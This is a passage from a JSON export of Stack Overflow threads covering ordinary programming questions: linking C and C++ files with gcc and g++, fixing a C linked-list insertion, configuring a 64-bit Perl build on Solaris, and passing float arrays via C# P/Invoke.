"https://www.gravatar.com/avatar/28d90b21740703645b17d3214ddb5646?s=128&d=identicon&r=PG", "display_name": "Iceknight", "link": "https://stackoverflow.com/users/5951521/iceknight"}, "edited": false, "score": 0, "creation_date": 1524666112, "post_id": 50024452, "comment_id": 87065404, "body": "i use the extern &quot;C&quot; to read the values of the struct in the C file. In the c++ file i read the csv and save the elements in the struct."}, {"owner": {"reputation": 10359, "user_id": 1216776, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/504692de390dabd9ca22fd716e178993?s=128&d=identicon&r=PG", "display_name": "stark", "link": "https://stackoverflow.com/users/1216776/stark"}, "edited": false, "score": 0, "creation_date": 1524666234, "post_id": 50024452, "comment_id": 87065473, "body": "extern &quot;C&quot; just makes the function name compatible.  It doesn&#39;t have any effect on the data being passed as arguments."}, {"owner": {"reputation": 10498, "user_id": 669576, "user_type": "registered", "accept_rate": 85, "profile_image": "https://i.stack.imgur.com/mRhrB.jpg?s=128&g=1", "display_name": "Johnny Mopp", "link": "https://stackoverflow.com/users/669576/johnny-mopp"}, "edited": false, "score": 0, "creation_date": 1524666418, "post_id": 50024452, "comment_id": 87065634, "body": "Ok. I see. I missed that part. Are you getting the error from the linker?"}, {"owner": {"reputation": 1, "user_id": 5951521, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/28d90b21740703645b17d3214ddb5646?s=128&d=identicon&r=PG", "display_name": "Iceknight", "link": "https://stackoverflow.com/users/5951521/iceknight"}, "edited": false, "score": 0, "creation_date": 1524666592, "post_id": 50024452, "comment_id": 87065780, "body": "i&#39;m getting the error when i try to complie the C file where i define the vector and recall the function"}, {"owner": {"reputation": 1073, "user_id": 921729, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b630bd9941c4001f6c8aae48eaac45b8?s=128&d=identicon&r=PG", "display_name": "Khoyo", "link": "https://stackoverflow.com/users/921729/khoyo"}, "edited": false, "score": 1, "creation_date": 1524666865, "post_id": 50024452, "comment_id": 87065977, "body": "How are you compiling it exactly ?"}, {"owner": {"reputation": 1, "user_id": 5951521, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/28d90b21740703645b17d3214ddb5646?s=128&d=identicon&r=PG", "display_name": "Iceknight", "link": "https://stackoverflow.com/users/5951521/iceknight"}, "edited": false, "score": 0, "creation_date": 1524667262, "post_id": 50024452, "comment_id": 87066244, "body": "g++ -c lettura.cpp for the cpp file. For the c file i use g++ complete.c -o complete ."}, {"owner": {"reputation": 5074, "user_id": 5522303, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c236ba3d52af53355a4d1a44a5145b04?s=128&d=identicon&r=PG&f=1", "display_name": "Kevin", "link": "https://stackoverflow.com/users/5522303/kevin"}, "edited": false, "score": 1, "creation_date": 1524667303, "post_id": 50024452, "comment_id": 87066257, "body": "So you aren&#39;t linking the C++ file into the executable? That&#39;s the problem."}, {"owner": {"reputation": 1, "user_id": 5951521, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/28d90b21740703645b17d3214ddb5646?s=128&d=identicon&r=PG", "display_name": "Iceknight", "link": "https://stackoverflow.com/users/5951521/iceknight"}, "edited": false, "score": 0, "creation_date": 1524667441, "post_id": 50024452, "comment_id": 87066363, "body": "Can you wrote me the command i have to use? I&#39;m new on C and linux"}, {"owner": {"reputation": 8430, "user_id": 2742717, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/d1dec1aa6accf3589489ebd42634f7a0?s=128&d=identicon&r=PG", "display_name": "Swift - Friday Pie", "link": "https://stackoverflow.com/users/2742717/swift-friday-pie"}, "edited": false, "score": 0, "creation_date": 1524669382, "post_id": 50024452, "comment_id": 87067788, "body": "the content of question is quite poor as it appears, because it is a build process problem"}, {"owner": {"reputation": 8430, "user_id": 2742717, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/d1dec1aa6accf3589489ebd42634f7a0?s=128&d=identicon&r=PG", "display_name": "Swift - Friday Pie", "link": "https://stackoverflow.com/users/2742717/swift-friday-pie"}, "edited": false, "score": 0, "creation_date": 1524669434, "post_id": 50024452, "comment_id": 87067824, "body": "Possible duplicate of <a href=\"https://stackoverflow.com/questions/22154119/compiling-and-linking-c-and-c-files\">Compiling and linking C and C++ files</a>"}], "answers": [{"comments": [{"owner": {"reputation": 208003, "user_id": 841108, "user_type": "registered", "accept_rate": 61, "profile_image": "https://i.stack.imgur.com/Fm52y.png?s=128&g=1", "display_name": "Basile Starynkevitch", "link": "https://stackoverflow.com/users/841108/basile-starynkevitch"}, "edited": false, "score": 0, "creation_date": 1524667971, "post_id": 50025242, "comment_id": 87066766, "body": "Better use <code>-Wall -Wextra -g</code>  for both <code>gcc</code> and <code>g++</code>"}, {"owner": {"reputation": 1, "user_id": 5951521, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/28d90b21740703645b17d3214ddb5646?s=128&d=identicon&r=PG", "display_name": "Iceknight", "link": "https://stackoverflow.com/users/5951521/iceknight"}, "edited": false, "score": 0, "creation_date": 1524671485, "post_id": 50025242, "comment_id": 87069242, "body": "ok thanks, i&#39;ll try"}, {"owner": {"reputation": 1, "user_id": 5951521, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/28d90b21740703645b17d3214ddb5646?s=128&d=identicon&r=PG", "display_name": "Iceknight", "link": "https://stackoverflow.com/users/5951521/iceknight"}, "edited": false, "score": 0, "creation_date": 1524756977, "post_id": 50025242, "comment_id": 87110124, "body": "Ok, now they compiles without errors but when i launch ./COMPLETE it stops after a while. Maybe i made an error when i recall the values. I&#39;ll search for the errors. Thanks"}, {"owner": {"reputation": 1, "user_id": 5951521, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/28d90b21740703645b17d3214ddb5646?s=128&d=identicon&r=PG", "display_name": "Iceknight", "link": "https://stackoverflow.com/users/5951521/iceknight"}, "edited": false, "score": 0, "creation_date": 1524813536, "post_id": 50025242, "comment_id": 87130907, "body": "The code now compiles and work correctly. Thanks"}], "tags": [], "owner": {"reputation": 5074, "user_id": 5522303, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c236ba3d52af53355a4d1a44a5145b04?s=128&d=identicon&r=PG&f=1", "display_name": "Kevin", "link": "https://stackoverflow.com/users/5522303/kevin"}, "is_accepted": false, "score": 1, "last_activity_date": 1524667942, "last_edit_date": 1524667942, "creation_date": 1524667631, "answer_id": 50025242, "question_id": 50024452, "link": "https://stackoverflow.com/questions/50024452/recall-a-struct-from-c-to-c/50025242#50025242", "title": "Recall a struct from C++ to C", "body": "<p>According to your comment this is how you're compiling:</p>\n\n<blockquote>\n  <p><code>g++ -c lettura.cpp</code> for the cpp file. For the c file i use <code>g++ complete.c -o complete</code></p>\n</blockquote>\n\n<p>This is compiling the C++ file into an object file and then compiling the C file into an executable. You need to link in the object file as well.</p>\n\n<p>A few options:</p>\n\n<pre><code>g++ -c lettura.cpp                   # compile C++ file to lettura.o\ngcc -c complete.c                    # compile C file to complete.o\ng++ lettura.o complete.o -o complete # link object files into executable 'complete'\n\ng++ lettura.cpp complete.c -o complete # compile and link in one step\n</code></pre>\n\n<p>Note that I'm using <code>gcc</code> to compile the C code and <code>g++</code> to compile the C++ code and to link.</p>\n\n<p>Ideally you should use a Makefile for this, but I think that's beyond the scope of this question/answer.</p>\n"}], "owner": {"reputation": 1, "user_id": 5951521, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/28d90b21740703645b17d3214ddb5646?s=128&d=identicon&r=PG", "display_name": "Iceknight", "link": "https://stackoverflow.com/users/5951521/iceknight"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 243, "favorite_count": 0, "closed_date": 1524673099, "answer_count": 1, "score": -1, "last_activity_date": 1524667942, "creation_date": 1524665360, "last_edit_date": 1524667135, "question_id": 50024452, "link": "https://stackoverflow.com/questions/50024452/recall-a-struct-from-c-to-c", "closed_reason": "Not suitable for this site", "title": "Recall a struct from C++ to C", "body": "<p>I'm trying to read a struct of a program i wrote in <code>c++</code> into a <code>c</code> program. I created a <code>.h</code> with the <code>struct</code> and the <code>extern C</code> for the function. Then i wrote the C++ program that read a <code>csv file</code> and save some elements in a <code>struct</code>. Now i have to recall the <code>struct</code> in a C program and read the values but i'm having a lot of problems. I don't know if i make some mistake in the <code>.cpp file</code> , in the <code>.h file</code> or in the C program. I'm working under linux.</p>\n\n<p>My <code>.h file</code> is :</p>\n\n<pre><code>typedef struct Buses{\n int maggiore;\n int minore;\n}BusesStruct;\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\n    void get_buses(BusesStruct *);\n\n#ifdef __cplusplus\n}\n#endif\n</code></pre>\n\n<p>My cpp is</p>\n\n<pre><code>#include &lt;iostream&gt;\n#include &lt;fstream&gt;\n#include &lt;sstream&gt;\n#include &lt;string&gt;\n#include &lt;algorithm&gt;\n#include \"lettura.h\"\nusing namespace std;\n\nvoid get_buses(BusesStruct * bus_scelti){\n//leggo il file csv\n    string line,nomefile;\n    ifstream myfile;\n    cout &lt;&lt; \"Quale file si vuole aprire? \" &lt;&lt; endl;\n    cin &gt;&gt; nomefile;\n    myfile.open(nomefile.c_str());\n    int j=0;\n    if (myfile.is_open()) {\n        int primobus;\n        int secondobus;\n        cout &lt;&lt; \"Digitare il numero di uno dei due BUS sul quale si vuole eseguire l'operazione (1-9): \" &lt;&lt; endl;\n        cin &gt;&gt; primobus;\n        cout &lt;&lt; \"Digitare il numero di un secondo BUS sul quale si vuole eseguire l'operazione (1-9): \" &lt;&lt; endl;\n        cin &gt;&gt; secondobus;\n        int bus1_scelto;\n        int bus2_scelto;\n        while (getline(myfile,line)) {\n            istringstream myline(line);\n            string bus[10];\n            for (int i=0; i&lt;9; i++){\n                    getline(myline,bus[i+1],';');\n                }\n\n            for (int i=0; i&lt;10; i++){\n                if(i == primobus){\n                    int bus1_scelto_c = atoi(bus[i].c_str());\n                    bus1_scelto=bus1_scelto_c;\n                }\n                if(i == secondobus){\n                    int bus2_scelto_c = atoi(bus[i].c_str());\n                    bus2_scelto=bus2_scelto_c;\n                }\n            }\n            bus_scelti[j].maggiore=max(bus1_scelto,bus2_scelto);\n            bus_scelti[j].minore=min(bus1_scelto,bus2_scelto);\n            j=j+1;          \n        }   \n    }\n}\n</code></pre>\n\n<p>In my C file i wrote <code>#include lettura.h</code> to recall the function : </p>\n\n<pre><code>BusesStruct bus_scelti[10005];\nget_buses(bus_scelti);\n</code></pre>\n\n<p>And to define my vector and recall the function.\nI got the <code>error</code> :</p>\n\n<blockquote>\n  <p>reference not define to 'get_buses'.</p>\n</blockquote>\n\n<p>Can you help me? Thanks</p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 22348, "user_id": 9528746, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/ukFe1.png?s=128&g=1", "display_name": "Max Langhof", "link": "https://stackoverflow.com/users/9528746/max-langhof"}, "edited": false, "score": 1, "creation_date": 1524666044, "post_id": 50024354, "comment_id": 87065358, "body": "It would be helpful if you could translate the function names into English to make the code more understandable."}, {"owner": {"reputation": 102, "user_id": 9670079, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-r10wQVGNNJM/AAAAAAAAAAI/AAAAAAAAAAk/ZtmIxl8-q2E/photo.jpg?sz=128", "display_name": "St3ve R0nix", "link": "https://stackoverflow.com/users/9670079/st3ve-r0nix"}, "reply_to_user": {"reputation": 22348, "user_id": 9528746, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/ukFe1.png?s=128&g=1", "display_name": "Max Langhof", "link": "https://stackoverflow.com/users/9528746/max-langhof"}, "edited": false, "score": 0, "creation_date": 1524670240, "post_id": 50024354, "comment_id": 87068427, "body": "Max Langhof, here there is my previous version of the answer, i did some translation there. <a href=\"https://stackoverflow.com/questions/49999982/parameters-of-linked-list-functions-called-in-switch-case\" title=\"parameters of linked list functions called in switch case\">stackoverflow.com/questions/49999982/&hellip;</a>"}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1524769375, "post_id": 50024354, "comment_id": 87116672, "body": "<code>scanf(&quot; %s&quot;, p-&gt;nome);</code> has no width limit, as bad as <code>gets(p-&gt;nome);</code>.  Code should not use either.  Research <code>fgets()</code> and using width limits in <code>scanf()</code>."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1524769818, "post_id": 50024354, "comment_id": 87116870, "body": "Post rolled back.  Do not post answers in your question.   You can post your own answer below.  See <a href=\"https://stackoverflow.com/help/self-answer\">Can I answer my own question?</a>."}], "answers": [{"comments": [{"owner": {"reputation": 328, "user_id": 9591612, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/CNYpQ.jpg?s=128&g=1", "display_name": "Sandeep", "link": "https://stackoverflow.com/users/9591612/sandeep"}, "reply_to_user": {"reputation": 102, "user_id": 9670079, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-r10wQVGNNJM/AAAAAAAAAAI/AAAAAAAAAAk/ZtmIxl8-q2E/photo.jpg?sz=128", "display_name": "St3ve R0nix", "link": "https://stackoverflow.com/users/9670079/st3ve-r0nix"}, "edited": false, "score": 0, "creation_date": 1524745739, "post_id": 50024849, "comment_id": 87101930, "body": "Not sure what happened. I just copied above code, compiled and tested it. Got same result. BTW, i am using MS Visual Studio 2012 IDE for that. Which compiler you are using?"}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1524769573, "post_id": 50024849, "comment_id": 87116776, "body": "Minor: The <code>&quot; &quot;</code> before <code>&quot;%d&quot;</code> and  <code>&quot;%s&quot;</code> as in <code>scanf(&quot; %d&quot;, &amp;scelta);</code> is not needed.  <code>&quot;%d&quot;</code> and  <code>&quot;%s&quot;</code> consume leading white-space already."}], "tags": [], "owner": {"reputation": 328, "user_id": 9591612, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/CNYpQ.jpg?s=128&g=1", "display_name": "Sandeep", "link": "https://stackoverflow.com/users/9591612/sandeep"}, "is_accepted": true, "score": 0, "last_activity_date": 1524723688, "last_edit_date": 1524723688, "creation_date": 1524666505, "answer_id": 50024849, "question_id": 50024354, "link": "https://stackoverflow.com/questions/50024354/how-to-insert-multiple-data-in-linked-list/50024849#50024849", "title": "How to insert multiple data in linked list", "body": "<p>This question is exactly duplicate copy of a question posted yesterday and marked as duplicate. But, here is your working code:</p>\n\n<pre><code> #include &lt;stdio.h&gt;\n #include &lt;stdlib.h&gt;\n #include &lt;string.h&gt;\n #include &lt;limits.h&gt;\n\nstruct Prova\n{\n  char nome[16];\n  int id;\n};\n\ntypedef struct Node {\n  struct Prova struttura;\n  struct Node * next;\n\n}TNodo;\ntypedef TNodo* Nodo;\n\nNodo NuovaPrenotazione(struct Prova  p, Nodo pp)\n{\n  Nodo temp;\n\n  temp = (Nodo)malloc(sizeof(struct Node));\n\n  temp-&gt;struttura = p;\n  temp-&gt;next = pp;\n\n  pp = temp;\n  return pp;\n}\n\nvoid LeggiPrenotazione(struct Prova * p)\n{\n  printf(\"\\nNome Cliente:\");\n  scanf(\" %s\", p-&gt;nome);\n  printf(\"\\nID:\");\n  scanf(\" %d\", &amp;p-&gt;id);\n}\n\nvoid Visualizza(struct Prova  p)\n{\n  printf(\"%s %d\\n\", p.nome, p.id);\n\n}\n\nvoid VisualizzaPrenotazione(Nodo  nodo)\n{\n while(nodo != NULL)\n{\n   Visualizza(nodo-&gt;struttura);\n   nodo = nodo-&gt;next;\n}\n\n}\n\nint Menu()\n{\n  int scelta;\n\n  printf(\"*** M E N U ***\\n\"\n     \"1 - New\\n\"\n     \"2 - Print\\n\"\n     \"0 - Esci\\n\"\n     \"Scelta --&gt; \");\n   scanf(\" %d\", &amp;scelta);\n\n  return scelta;\n}\n\n\n\nint main()\n{\n  int scelta;\n  struct Prova test;\nNodo lista = NULL;\n  do {\n    scelta = Menu();\n\n    switch (scelta)\n    {\n      case 1:  LeggiPrenotazione(&amp;test);\n           lista = NuovaPrenotazione(test, lista);\n      break;\n      case 2: VisualizzaPrenotazione(lista); break;\n      default: scelta = 0;\n    }\n\n  } while (scelta != 0);\n\n  return 0;\n}\n</code></pre>\n\n<p><strong>Update</strong>: Here is the output</p>\n\n<p><a href=\"https://i.stack.imgur.com/Zndqk.jpg\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/Zndqk.jpg\" alt=\"enter image description here\"></a></p>\n"}], "owner": {"reputation": 102, "user_id": 9670079, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-r10wQVGNNJM/AAAAAAAAAAI/AAAAAAAAAAk/ZtmIxl8-q2E/photo.jpg?sz=128", "display_name": "St3ve R0nix", "link": "https://stackoverflow.com/users/9670079/st3ve-r0nix"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 687, "favorite_count": 0, "accepted_answer_id": 50024849, "answer_count": 1, "score": -3, "last_activity_date": 1527080728, "creation_date": 1524665065, "last_edit_date": 1527080728, "question_id": 50024354, "link": "https://stackoverflow.com/questions/50024354/how-to-insert-multiple-data-in-linked-list", "title": "How to insert multiple data in linked list", "body": "<p>This program asks for two data ( a name and an id), and then stores them in a linked list and then it should output all the data one by one. </p>\n\n<pre><code> #include &lt;stdio.h&gt;\n #include &lt;stdlib.h&gt;\n #include &lt;string.h&gt;\n\n\nstruct Test\n{\n  char name[16];\n  int id;\n};\n\ntypedef struct Node {\n  struct Test structure;\n  struct Node * next;\n\n}TNode;\ntypedef TNodo* Node;\n\nvoid NewDatainNode(struct Test  p, Node *pp)\n{\n  TNode *temp;\n\n  temp = malloc(sizeof(struct Node));\n\n  temp-&gt;structure = p;\n  temp-&gt;next = NULL;\n\n  *pp = temp;\n\n}\n\nvoid ReadData(struct Test * p)\n{\n  printf(\"\\nName:\");\n  scanf(\" %s\", p-&gt;name);\n  printf(\"\\nID:\");\n  scanf(\" %d\", &amp;p-&gt;id);\n}\n\n\nvoid ViewNodes(Node  node)\n{\n while(node != NULL)\n{\n   printf(\"%s %d\\n\",node-&gt;structure.name, node-&gt;structure.id);\n   node = node-&gt;next;\n}\n\n}\n\nint Menu()\n{\n  int c;\n\n  printf(\"\\n\\tM E N U ***\\n\"\n     \"1 - New\\n\"\n     \"2 - Print\\n\"\n     \"0 - Exit\\n\"\n     \"\\n&gt;&gt; \");\n   scanf(\" %d\", &amp;c);\n\n  return c;\n}\n\n\n\nint main()\n{\n  int c;\n  struct Prova test;\nstruct Node * list = NULL;\n  do {\n    c = Menu();\n\n    switch (c)\n    {\n      case 1:  ReadData(&amp;test);\n               NewDatainNode(test, &amp;list);break;\n      case 2:  ViewNodes(lista); break;\n      default: c = 0;\n    }\n\n  } while (c != 0);\n\n  return 0;\n}\n</code></pre>\n\n<p>The problem is that it outputs only the last data that has been inserted, what should i do to make it output all the data retrieved in function NuovaPrenotazione()?.</p>\n\n<p>UPDATE: Now the function <code>NewDatainNodes()</code> looks like this:</p>\n\n<pre><code>void NewDatainNode(struct Test  p, Node *pp)\n{\n  TNode *temp;\n\n  temp = malloc(sizeof(struct Node));\n\n  temp-&gt;structure = p;\n  temp-&gt;next = *pp;\n\n  *pp = temp;\n\n}\n</code></pre>\n\n<p>Thanks to Sandeep for the correction, the function works even without a return value,the problem was <code>temp-&gt;structure = NULL</code>.</p>\n"}, {"tags": ["c", "perl", "gcc", "64-bit", "solaris"], "comments": [{"owner": {"reputation": 27420, "user_id": 4756299, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e38adc5559df095cfe10c664916e8ffa?s=128&d=identicon&r=PG&f=1", "display_name": "Andrew Henle", "link": "https://stackoverflow.com/users/4756299/andrew-henle"}, "edited": false, "score": 0, "creation_date": 1524674579, "post_id": 50024266, "comment_id": 87070973, "body": "Did you rerun your configuration to fully detect 64-bit options?  It looks like you tried to just change the compile flags using the same source directory that was already configured for a 32-bit build."}, {"owner": {"reputation": 750, "user_id": 519151, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/480c0be1bd2a9c44dc676daf9f4d157f?s=128&d=identicon&r=PG", "display_name": "Isaac", "link": "https://stackoverflow.com/users/519151/isaac"}, "reply_to_user": {"reputation": 27420, "user_id": 4756299, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e38adc5559df095cfe10c664916e8ffa?s=128&d=identicon&r=PG&f=1", "display_name": "Andrew Henle", "link": "https://stackoverflow.com/users/4756299/andrew-henle"}, "edited": false, "score": 0, "creation_date": 1524724077, "post_id": 50024266, "comment_id": 87088302, "body": "Yes, I have freshly unpacked the source befor configuring and building. However my build scripts are a bit convoluted, so I will double check there is nothing funky going on. Will report back later."}, {"owner": {"reputation": 27420, "user_id": 4756299, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e38adc5559df095cfe10c664916e8ffa?s=128&d=identicon&r=PG&f=1", "display_name": "Andrew Henle", "link": "https://stackoverflow.com/users/4756299/andrew-henle"}, "edited": false, "score": 0, "creation_date": 1524735273, "post_id": 50024266, "comment_id": 87095154, "body": "You need to ensure the compilations done during the configuration stage are also done with <code>-m64</code>.  Look through your configuration output.  If you see things like <code>sizeof(long) = 4</code>, the configuration was done with 32-bit compiles, which will produce incorrect results.  Because the 32-bit <code>FILE</code> structure on Solaris does have <code>_ptr</code> and <code>_cnt</code> members, while the 64-bit <code>FILE</code> structure is totally opaque."}, {"owner": {"reputation": 750, "user_id": 519151, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/480c0be1bd2a9c44dc676daf9f4d157f?s=128&d=identicon&r=PG", "display_name": "Isaac", "link": "https://stackoverflow.com/users/519151/isaac"}, "reply_to_user": {"reputation": 27420, "user_id": 4756299, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e38adc5559df095cfe10c664916e8ffa?s=128&d=identicon&r=PG&f=1", "display_name": "Andrew Henle", "link": "https://stackoverflow.com/users/4756299/andrew-henle"}, "edited": false, "score": 0, "creation_date": 1524735529, "post_id": 50024266, "comment_id": 87095305, "body": "Thank you @AndrewHenle - I think you actually nailed it. It was indeed a missing configure flag that caused the error. See my answer below. You helped me to find the solution."}], "answers": [{"tags": [], "owner": {"reputation": 750, "user_id": 519151, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/480c0be1bd2a9c44dc676daf9f4d157f?s=128&d=identicon&r=PG", "display_name": "Isaac", "link": "https://stackoverflow.com/users/519151/isaac"}, "is_accepted": true, "score": 2, "last_activity_date": 1524752891, "last_edit_date": 1524752891, "creation_date": 1524735418, "answer_id": 50039650, "question_id": 50024266, "link": "https://stackoverflow.com/questions/50024266/compiling-perl-as-64-bit-on-solaris-10-sparc/50039650#50039650", "title": "compiling perl as 64 bit on solaris 10 sparc", "body": "<p>It turns out I needed to add the <code>-Duse64bitall</code> flag to the <code>Configure</code> script. So finally I was able to build with</p>\n\n<pre><code>export CFLAGS=-m64 # not sure if really nessessary - just what I did\n./Configure -Duse64bitall -Dcc=gcc -d\nmake\n</code></pre>\n\n<p>For my setup I also need some more libraries, so this is a rather simplified version. However it solved the problem described in this post.</p>\n"}], "owner": {"reputation": 750, "user_id": 519151, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/480c0be1bd2a9c44dc676daf9f4d157f?s=128&d=identicon&r=PG", "display_name": "Isaac", "link": "https://stackoverflow.com/users/519151/isaac"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 144, "favorite_count": 0, "accepted_answer_id": 50039650, "answer_count": 1, "score": 1, "last_activity_date": 1524752891, "creation_date": 1524664825, "question_id": 50024266, "link": "https://stackoverflow.com/questions/50024266/compiling-perl-as-64-bit-on-solaris-10-sparc", "title": "compiling perl as 64 bit on solaris 10 sparc", "body": "<p>I am trying to compile <code>perl 5.22.2</code> on <code>Solaris</code>, sparc, as 64 bit (os is 64 bit). \nIt compiled and linked fine as a 32 bit binary, now I have added the <code>-m64</code> flag to <code>CFLAGS</code> and <code>LDFLAGS</code>, and I am getting the following error:</p>\n\n<pre><code>...skipping...\nperlio.c:3400: error: structure has no member named `_ptr'\nperlio.c:3408: error: structure has no member named `_ptr'\nperlio.c: In function `PerlIOStdio_get_base':\nperlio.c:3531: error: structure has no member named `_base'\nperlio.c: In function `PerlIOStdio_get_bufsiz':\nperlio.c:3538: error: structure has no member named `_cnt'\nperlio.c:3538: error: structure has no member named `_ptr'\nperlio.c:3538: error: structure has no member named `_base'\nperlio.c: In function `PerlIOStdio_get_ptr':\nperlio.c:3547: error: structure has no member named `_ptr'\nperlio.c: In function `PerlIOStdio_get_cnt':\nperlio.c:3554: error: structure has no member named `_cnt'\nperlio.c: In function `PerlIOStdio_set_ptrcnt':\nperlio.c:3575: error: structure has no member named `_ptr'\nperlio.c:3594: error: structure has no member named `_cnt'\nmake: *** [perlio.o] Error 1\n</code></pre>\n\n<p>For reference, i have extracted the mentioned lines from <code>perlio.c</code>:</p>\n\n<pre><code>3400:   STDCHAR *eptr = (STDCHAR*)PerlSIO_get_ptr(s);\n3408:       if ((STDCHAR*)PerlSIO_get_ptr(s) != --eptr || ((*eptr &amp; 0xFF) != ch)) {\n3531:    return (STDCHAR*)PerlSIO_get_base(stdio);\n3538:    return PerlSIO_get_bufsiz(stdio);\n3547:    return (STDCHAR*)PerlSIO_get_ptr(stdio);\n3554:    return PerlSIO_get_cnt(stdio);\n3575:   PerlSIO_set_ptr(stdio, ptr); /* LHS STDCHAR* cast non-portable */\n3594:    PerlSIO_set_cnt(stdio, cnt);\n</code></pre>\n\n<p>It looks like its doing something strange with the source, notice how <code>_ptr</code> is treated as a seperate entity, whereas the function is called <code>PerlSIO_get_ptr</code>. Looks like its being cut off.</p>\n\n<p>Anyone any idea what is going on here? FYI using something like perlbrew is not an option, I need to compile this myself :(.</p>\n"}, {"tags": ["c#", "c", "pinvoke", "marshalling", "dllimport"], "comments": [{"owner": {"reputation": 15695, "user_id": 682404, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/HxO2o.png?s=128&g=1", "display_name": "xxbbcc", "link": "https://stackoverflow.com/users/682404/xxbbcc"}, "edited": false, "score": 0, "creation_date": 1524665819, "post_id": 50023961, "comment_id": 87065195, "body": "If their (original, I assume) type is <code>float</code>, why don&#39;t you pass them as such? Is the call to <code>Deduce()</code> async or on a separate thread where the calling function goes away before <code>Deduce</code> returns?"}, {"owner": {"reputation": 16129, "user_id": 401584, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/f52c02ef1784437c404e0c7719122b69?s=128&d=identicon&r=PG", "display_name": "IamIC", "link": "https://stackoverflow.com/users/401584/iamic"}, "reply_to_user": {"reputation": 15695, "user_id": 682404, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/HxO2o.png?s=128&g=1", "display_name": "xxbbcc", "link": "https://stackoverflow.com/users/682404/xxbbcc"}, "edited": false, "score": 0, "creation_date": 1524665923, "post_id": 50023961, "comment_id": 87065272, "body": "Yes, they are floats. It&#39;s a synchronous call in the same thread. Are you suggesting I just used <code>fixed</code> to pin the arrays? I prefer not to do that."}, {"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 0, "creation_date": 1524666385, "post_id": 50023961, "comment_id": 87065612, "body": "If you are passing floats to a function expecting pointers to int, the C code will halt and catch fire."}, {"owner": {"reputation": 15695, "user_id": 682404, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/HxO2o.png?s=128&g=1", "display_name": "xxbbcc", "link": "https://stackoverflow.com/users/682404/xxbbcc"}, "edited": false, "score": 1, "creation_date": 1524666453, "post_id": 50023961, "comment_id": 87065658, "body": "What&#39;s your C function signature (in the header, not the P/Invoke bit that you have for it)?"}, {"owner": {"reputation": 16129, "user_id": 401584, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/f52c02ef1784437c404e0c7719122b69?s=128&d=identicon&r=PG", "display_name": "IamIC", "link": "https://stackoverflow.com/users/401584/iamic"}, "edited": false, "score": 0, "creation_date": 1524666565, "post_id": 50023961, "comment_id": 87065763, "body": "I&#39;m passing pointers to float[] to a C function that is expecting float*. The code works fine."}, {"owner": {"reputation": 870061, "user_id": 17034, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Cii6b.png?s=128&g=1", "display_name": "Hans Passant", "link": "https://stackoverflow.com/users/17034/hans-passant"}, "edited": false, "score": 1, "creation_date": 1524667930, "post_id": 50023961, "comment_id": 87066732, "body": "You are helping too much, just let the pinvoke marshaller do the job.  Change float* to float[].  Either way it is up to you to ensure that the arrays are sized correctly."}, {"owner": {"reputation": 16129, "user_id": 401584, "user_type": "registered", "accept_rate": 90, "profile_image": 